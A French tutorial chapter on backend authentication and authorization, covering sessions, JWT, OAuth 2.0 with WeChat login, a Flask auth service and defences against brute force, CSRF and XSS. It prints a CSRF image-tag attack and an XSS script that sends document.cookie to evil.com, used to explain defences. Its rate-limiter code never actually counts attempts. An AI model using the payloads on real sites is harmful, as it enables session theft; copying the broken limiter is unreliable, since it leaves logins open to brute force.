# Principes : Authentification et autorisation
> 💡 **Guide d'apprentissage** : Ce chapitre vous plonge dans le « système de contrôle d'accès » des systèmes backend — l'authentification et l'autorisation. Nous commencerons par la question fondamentale « Qui es-tu ? » et progresserons pas à pas à travers les solutions modernes comme Session, JWT et OAuth 2.0.

<AuthEvolutionDemo />

## 0. Introduction : le « contrôle d'accès » du système

Pourquoi restez-vous connecté à WeChat même après avoir fermé et rouvert l'application ?
Comment Bilibili sait-il si vous êtes un membre premium ou un utilisateur standard ?
Pourquoi n'avez-vous pas besoin de saisir votre mot de passe lorsque vous vous connectez à un site tiers avec WeChat ?

Derrière tout cela se cache un système central : **l'authentification et l'autorisation (Authentication & Authorization)**.

Si l'on compare un système backend à un immeuble :

- **Authentification (Authentication)** : Confirmer « qui vous êtes » (vérifier une carte d'identité / un badge d'accès).
- **Autorisation (Authorization)** : Confirmer « où vous pouvez aller » (les VIP peuvent entrer dans le salon VIP, les utilisateurs ordinaires non).

### 0.1 Pourquoi l'authentification est-elle nécessaire

Il n'y a qu'une seule raison : **protéger les ressources**.

- **Protection de la vie privée** : Vos informations personnelles et votre historique de chat ne sont visibles que par vous.
- **Contrôle d'accès** : Les administrateurs peuvent supprimer des utilisateurs, les utilisateurs ordinaires non.
- **Prévention des abus** : Empêcher les appels malveillants et le scraping d'API.

<AuthBasicsDemo />

### 0.2 Démonstration interactive : flux de connexion

Découvrons comment fonctionnent l'authentification et l'autorisation à travers une démonstration de connexion réelle.

<AuthInteractiveLoginDemo />

**Point clé** : L'authentification est la première ligne de défense — toutes les opérations sensibles doivent d'abord vérifier l'identité.

---

## 1. Concepts fondamentaux : Authentification vs Autorisation

### 1.1 Authentification (Authentication) : Qui êtes-vous

Confirmer l'identité de l'utilisateur.

- _Exemple_ : Saisir un nom d'utilisateur et un mot de passe, scanner une empreinte digitale, reconnaissance faciale.
- _Résultat_ : Un jeton (Token) qui vous représente.
- _Abréviation anglaise_ : **AuthN**

### 1.2 Autorisation (Authorization) : Que pouvez-vous faire

Confirmer les permissions de l'utilisateur.

- _Exemple_ : L'administrateur peut supprimer des articles, l'utilisateur ordinaire ne peut que liker.
- _Résultat_ : Autoriser ou refuser l'accès.
- _Abréviation anglaise_ : **AuthZ**

### 1.3 Relation entre les deux

```
Requête utilisateur → Authentification (Qui êtes-vous ?) → Autorisation (Pouvez-vous le faire ?) → Exécution de la logique métier
                      ↓                                      ↓
                 Vérification d'identité              Vérification des permissions
                 (Token valide ?)                     (Avoir la permission delete ?)
```

<AuthNvsAuthZDemo />

**Point clé** : Authentifiez d'abord, puis autorisez. Ce n'est qu'après avoir confirmé « qui vous êtes » que l'on peut déterminer « ce que vous pouvez faire ».

---

## 2. Histoire de l'évolution des solutions

### 2.1 Première génération : HTTP Basic Authentication

La solution la plus ancienne, qui place directement le nom d'utilisateur et le mot de passe dans l'en-tête HTTP.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Avantages** : Simple, pris en charge par tous les navigateurs.
- **Inconvénients** :
  - Non sécurisé (Base64 est décodable, équivalent à du texte clair).
  - Le mot de passe est transmis à chaque requête (facilement interceptable).
  - Impossible de se déconnecter activement (sauf en fermant le navigateur).

**Conclusion** : Convient uniquement aux outils de test internes, jamais à utiliser en production.

### 2.2 Deuxième génération : Session + Cookie

La solution classique du développement Web.

**Flux** :

```
1. L'utilisateur se connecte (POST /login)
   → Le serveur vérifie le nom d'utilisateur et le mot de passe
   → Crée une Session (dans la mémoire du serveur ou Redis)
   → Retourne Set-Cookie: session_id=abc123

2. Requêtes suivantes
   → Le navigateur envoie automatiquement Cookie: session_id=abc123
   → Le serveur recherche la Session à partir de session_id
   → Si trouvée, il considère que « vous êtes vous »
```

**Exemple de code** :

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Vérifier le nom d'utilisateur et le mot de passe
    user = db.authenticate(username, password)
    if user:
        # Créer une Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Nom d'utilisateur ou mot de passe incorrect"}, 401

@app.route("/api/admin/users")
def get_users():
    # Vérifier la Session
    if "user_id" not in session:
        return {"error": "Non connecté"}, 401

    # Vérifier les permissions
    if session.get("role") != "admin":
        return {"error": "Permissions insuffisantes"}, 403

    # Exécuter la logique métier
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Avantages** :

- Simple et intuitif, facile à comprendre.
- Le serveur peut révoquer activement la session (supprimer la Session).

**Inconvénients** :

- **Serveur avec état** : Doit stocker les Sessions, plusieurs serveurs doivent les partager (ex. Redis).
- **Difficultés cross-origin** : Les Cookies ne peuvent pas traverser les domaines par défaut (problème CORS).
- **Attaque CSRF** : Les sites malveillants peuvent usurper vos Cookies.

**Conclusion** : Convient aux applications Web traditionnelles (rendu côté serveur), mais pas aux applications mobiles ni aux SPA modernes.

### 2.3 Troisième génération : Token (JWT)

La solution dominante du Web moderne.

**Idée centrale** : Ne pas stocker l'état côté serveur, mais chiffrer les informations utilisateur dans un Token stocké côté client.

**Structure du JWT** :

```
JWT = Header.Payload.Signature

Exemple :
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header** : Informations sur l'algorithme (ex. `{"alg": "HS256", "typ": "JWT"}`).
- **Payload** : Informations utilisateur (ex. `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature** : Signature (anti-falsification).

**Flux** :

```python
# 1. Connexion de l'utilisateur
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Générer le JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Expire dans 24 heures
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Nom d'utilisateur ou mot de passe incorrect"}, 401

# 2. Requêtes suivantes
@app.route("/api/admin/users")
def get_users():
    # Récupérer le Token depuis le Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Token non fourni"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Vérifier et parser le Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token expiré"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token invalide"}, 401

    # Vérifier les permissions
    if payload.get("role") != "admin":
        return {"error": "Permissions insuffisantes"}, 403

    # Exécuter la logique métier
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Avantages** :

- **Sans état** : Le serveur ne stocke pas les Sessions, facile à mettre à l'échelle horizontalement.
- **Cross-origin friendly** : Placé dans le Header, non soumis aux restrictions cross-origin des Cookies.
- **Mobile friendly** : Les applications natives peuvent également l'utiliser facilement.
- **Riche en informations** : Le Payload peut contenir des informations utilisateur, des permissions, etc.

**Inconvénients** :

- **Impossible de révoquer activement** : Une fois émis, le Token reste valide jusqu'à expiration (sauf utilisation d'une liste noire).
- **Payload visible** : Encodé en Base64, ne pas stocker d'informations sensibles (comme le mot de passe).
- **Token volumineux** : Doit être envoyé à chaque requête, plusieurs centaines d'octets.

**Conclusion** : La solution standard pour le Web et le mobile modernes.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0 : Connexion tierce

Vous avez certainement déjà vu ce bouton : « Se connecter avec WeChat », « Se connecter avec Google ».

C'est **OAuth 2.0** : un framework d'**autorisation** (pas d'authentification !).

### 3.1 Rôles principaux

| Rôle                     | Description                        | Exemple                       |
| :----------------------- | :--------------------------------- | :---------------------------- |
| **Resource Owner**       | Propriétaire de la ressource (utilisateur) | Vous                          |
| **Client**               | Application tierce                 | Un site web                   |
| **Authorization Server** | Serveur d'autorisation             | WeChat, Google                |
| **Resource Server**      | Serveur de ressources              | API d'informations utilisateur WeChat |

### 3.2 Mode Code d'autorisation (Authorization Code Flow)

Le mode le plus sécurisé, adapté aux serveurs avec backend.

**Flux** :

```
1. L'utilisateur clique sur « Se connecter avec WeChat »
   → Redirigé vers la page d'autorisation WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. L'utilisateur scanne le QR code et accepte l'autorisation
   → WeChat redirige vers votre site
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Votre backend échange le code contre un access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Retourne : { "access_token": "...", "openid": "..." }

4. Utiliser l'access_token pour obtenir les informations utilisateur
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Retourne : { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Exemple de code** :

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Rediriger vers la page d'autorisation WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Récupérer le code
    code = request.args.get("code")
    state = request.args.get("state")

    # Vérifier le state (anti-CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Échanger le code contre un access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Obtenir les informations utilisateur
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Créer ou mettre à jour l'utilisateur localement
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Générer le JWT du système local
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Points clés** :

- **Le code ne peut être utilisé qu'une seule fois** : Il expire après usage pour empêcher l'interception.
- **state pour la protection anti-CSRF** : Génère une chaîne aléatoire, vérifiée lors du callback, pour empêcher la falsification par des sites malveillants.
- **redirect_uri doit correspondre** : Enregistré à l'avance sur la plateforme ouverte WeChat pour empêcher les attaques par redirection.

### 3.3 Autres modes

| Mode                                     | Scénario applicable                        | Sécurité            |
| :--------------------------------------- | :----------------------------------------- | :------------------ |
| **Mode Code d'autorisation**             | Serveurs avec backend                      | ⭐⭐⭐⭐⭐            |
| **Mode Implicite (Implicit)**            | Applications frontend uniquement (SPA)     | ⭐⭐⭐ (non recommandé) |
| **Mode Mot de passe (Resource Owner)**   | Applications de confiance élevée (ex. app officielle) | ⭐⭐                  |
| **Mode Client (Client Credentials)**     | Communication serveur à serveur (sans utilisateur) | ⭐⭐⭐⭐              |

<OAuth2ModesDemo />

---

## 4. Mise en pratique : concevoir un système d'authentification complet

### 4.1 Analyse des besoins

- **Support multi-plateforme** : Web, iOS, Android.
- **Connexion tierce** : WeChat, Google.
- **Contrôle des permissions** : Utilisateur standard, VIP, Administrateur.
- **Sécurité** : Anti-scraping, anti-détournement, anti-rejeu.

### 4.2 Conception de l'architecture

```
┌─────────────┐
│    Client    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Inscription, Connexion       │
│  - Émission et validation de Token │
│  - Intégration OAuth 2.0        │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 Conception de la base de données

```sql
-- Table des utilisateurs
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Table de liaison des fournisseurs d'authentification tierce
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- ID utilisateur du fournisseur tiers
    access_token TEXT,  -- Stockage chiffré
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Liste noire de Tokens (pour la révocation active)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI du JWT (identifiant unique)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Implémentation du code

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # En production, utiliser une variable d'environnement

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Vérifier si le nom d'utilisateur existe
        if db.get_user_by_username(username):
            raise ValueError("Nom d'utilisateur déjà existant")

        # 2. Hacher le mot de passe (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Créer l'utilisateur
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Émettre les Tokens
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Rechercher l'utilisateur
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Nom d'utilisateur ou mot de passe incorrect")

        # 2. Vérifier le mot de passe
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Nom d'utilisateur ou mot de passe incorrect")

        # 3. Émettre les Tokens
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (court terme, ex. 1 heure)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Identifiant unique
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (long terme, ex. 30 jours)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # Durée d'expiration de l'access_token (secondes)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token expiré")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token invalide")

    def logout(self, token: str):
        # Ajouter le Token à la liste noire
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Vérifier si le token est dans la liste noire
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token révoqué")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token expiré")
        except jwt.InvalidTokenError:
            raise ValueError("Token invalide")

# Décorateur API
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Récupérer le Token depuis le Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Token non fourni"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Vérifier le Token
                payload = auth_service.verify_token(token)
                # Injecter les informations utilisateur dans le contexte de la requête
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Non connecté"}, 401

            if request.user["role"] not in roles:
                return {"error": "Permissions insuffisantes"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Exemple d'utilisation
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Bonnes pratiques de sécurité

### 5.1 Stockage des mots de passe

**❌ Mauvaises pratiques** :

```python
# Stockage en clair (absolument interdit !)
db.save_password(username, password)

# Hachage MD5 / SHA1 (pas assez sécurisé, vulnérable aux tables arc-en-ciel)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Bonnes pratiques** :

```python
# bcrypt (hachage adaptatif, lent pour résister à la force brute)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # Plus le rounds est élevé, plus c'est sécurisé mais lent
)

# Vérification
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Mot de passe correct
```

**Pourquoi bcrypt ?**

- **Lent** : Volontairement conçu pour être lent (de l'ordre de la milliseconde), résiste à la force brute.
- **Adaptatif** : Le paramètre rounds peut être ajusté pour se renforcer avec la puissance matérielle.
- **Salé** : Intègre un sel aléatoire, résiste aux tables arc-en-ciel.

<PasswordHashingDemo />

### 5.2 Protection contre la force brute

- **Rate limiting** : Une même IP / nom d'utilisateur ne peut essayer que 5 fois par minute.
- **CAPTCHA** : Exiger un CAPTCHA après 3 échecs.
- **Verrouillage de compte** : Verrouiller le compte pendant 30 minutes après 10 échecs.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Retourne (nombre de tentatives, horodatage de la première tentative)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Réinitialiser après 1 minute
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Refuser si plus de 5 tentatives
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Re-cacher

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Vérifier le rate limiting
    if not check_rate_limit(username):
        return {"error": "Trop de tentatives, veuillez réessayer dans 1 minute"}, 429

    password = request.json["password"]

    # Vérifier le mot de passe
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Connexion réussie, réinitialiser le compteur
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Échec de connexion, enregistrer
        record_login_attempt(username)
        return {"error": "Nom d'utilisateur ou mot de passe incorrect"}, 401
```

### 5.3 Protection anti-CSRF (Cross-Site Request Forgery)

**Scénario d'attaque** :
Vous êtes connecté au site bancaire `bank.com`, puis vous visitez le site malveillant `evil.com`. La page de `evil.com` contient ce code :

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Votre navigateur envoie cette requête avec les Cookies de la banque (requête cross-origin), entraînant un transfert de fonds.

**Mesures de défense** :

1.  **CSRF Token** :
    - Le serveur génère un Token aléatoire, placé dans le formulaire.
    - Vérifier la correspondance du Token lors de la soumission.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Vérifier le CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token invalide"}, 403

    # Exécuter le transfert
    ...
```

2.  **SameSite Cookie** :
    - Définir l'attribut `SameSite` du Cookie sur `Strict` ou `Lax`.

```python
# Exemple Flask
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # ou 'Strict'
    SESSION_COOKIE_SECURE=True      # Autoriser uniquement HTTPS
)
```

3.  **Utiliser JWT (sans Cookie)** :
    - Les JWT sont stockés dans `localStorage`, ne sont pas envoyés automatiquement, protégés naturellement contre CSRF.

<CSRFDefenseDemo />

### 5.4 Protection anti-XSS (Cross-Site Scripting)

**Scénario d'attaque** :
Un utilisateur malveillant saisit dans la section commentaires :

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Si le site rend ce contenu directement, les Cookies des autres utilisateurs seront volés.

**Mesures de défense** :

1.  **Échappement de sortie** :
    - Convertir `<` en `&lt;`, `>` en `&gt;`.

```python
import html

def render_comment(comment):
    # Échapper le HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)** :
    - Définir l'en-tête HTTP pour restreindre les sources de scripts.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie** :
    - Définir l'attribut `HttpOnly` du Cookie, JavaScript ne peut pas le lire.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Résumé et parcours d'apprentissage

L'authentification est une « compétence fondamentale » des systèmes backend — sa maîtrise est indispensable pour construire des applications sécurisées et fiables.

### 6.1 Connaissances essentielles

| Connaissance                         | Importance   | Difficulté | Fréquence pratique |
| :----------------------------------- | :----------- | :--------- | :----------------- |
| **Session + Cookie**                 | ⭐⭐⭐⭐     | Moyenne    | Élevée             |
| **JWT**                              | ⭐⭐⭐⭐⭐   | Faible     | Très élevée        |
| **OAuth 2.0**                        | ⭐⭐⭐⭐     | Élevée     | Élevée             |
| **Hachage de mot de passe (bcrypt)** | ⭐⭐⭐⭐⭐   | Faible     | Très élevée        |
| **Rate limiting et anti-force brute** | ⭐⭐⭐⭐⭐  | Moyenne    | Très élevée        |
| **Défense CSRF**                     | ⭐⭐⭐⭐     | Moyenne    | Moyenne            |
| **Défense XSS**                      | ⭐⭐⭐⭐     | Faible     | Élevée             |

### 6.2 Parcours d'apprentissage

1.  **Débutant** (1-2 jours) :
    - Comprendre la différence entre authentification et autorisation.
    - Maîtriser le principe de Session + Cookie.
    - Implémenter une fonctionnalité simple d'inscription et de connexion.

2.  **Intermédiaire** (1 semaine) :
    - Apprendre le principe et l'implémentation de JWT.
    - Implémenter un système d'authentification basé sur JWT.
    - Maîtriser le hachage de mot de passe (bcrypt).

3.  **Pratique** (2-4 semaines) :
    - Intégrer OAuth 2.0 (connexion WeChat, Google).
    - Implémenter le rate limiting et la protection anti-force brute.
    - Se défendre contre les attaques courantes comme CSRF et XSS.

4.  **Approfondissement** (continu) :
    - Apprendre le RBAC (contrôle d'accès basé sur les rôles).
    - Étudier le SSO (Single Sign-On).
    - Explorer le Zero Trust Architecture (architecture zéro confiance).

### 6.3 Ressources recommandées

- **Standards** :
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Articles** :
  - JWT.io : https://jwt.io/
  - OAuth 2.0 : https://oauth.net/2/
- **Outils** :
  - jwt.io (débogage JWT en ligne)
  - Postman (test d'API)

---

## 7. Glossaire

| Terme             | Nom complet                 | Explication                                                                                                      |
| :---------------- | :-------------------------- | :--------------------------------------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **Authentification**. Confirmer « qui vous êtes » (ex. vérifier l'identité par mot de passe).                    |
| **AuthZ**         | Authorization               | **Autorisation**. Confirmer « ce que vous pouvez faire » (ex. seul l'administrateur peut supprimer).             |
| **Session**       | -                           | **Session**. Informations d'état utilisateur stockées côté serveur.                                              |
| **Cookie**        | -                           | **Cookie**. Petite donnée stockée par le navigateur, automatiquement envoyée à chaque requête.                   |
| **JWT**           | JSON Web Token              | **Jeton Web JSON**. Solution d'authentification sans état composée de trois parties : Header, Payload, Signature. |
| **OAuth 2.0**     | -                           | **Autorisation ouverte**. Framework standardisé pour la connexion tierce (ex. « Se connecter avec WeChat »).      |
| **SSO**           | Single Sign-On              | **Authentification unique**. Se connecter une fois pour accéder à plusieurs applications (ex. compte Google).     |
| **RBAC**          | Role-Based Access Control   | **Contrôle d'accès basé sur les rôles**. Déterminer les permissions selon le rôle de l'utilisateur (admin, user). |
| **CSRF**          | Cross-Site Request Forgery  | **Falsification de requête inter-sites**. L'attaquant incite l'utilisateur à envoyer une requête malveillante.    |
| **XSS**           | Cross-Site Scripting        | **Script inter-sites**. L'attaquant injecte un script malveillant dans une page web (ex. vol de Cookie).          |
| **bcrypt**        | -                           | **Algorithme de hachage de mot de passe**. Hachage lent conçu pour le stockage des mots de passe, anti-force brute. |
| **Access Token**  | -                           | **Jeton d'accès**. Jeton à courte durée de validité, utilisé pour accéder aux API.                               |
| **Refresh Token** | -                           | **Jeton de rafraîchissement**. Jeton à longue durée de validité, utilisé pour obtenir un nouvel Access Token.     |
| **Scope**         | -                           | **Portée des permissions**. Concept OAuth 2.0 indiquant les permissions demandées par l'application tierce.       |
| **PKCE**          | Proof Key for Code Exchange | **Clé de preuve pour l'échange de code**. Extension OAuth 2.0 pour le renforcement de la sécurité des clients publics (ex. SPA). |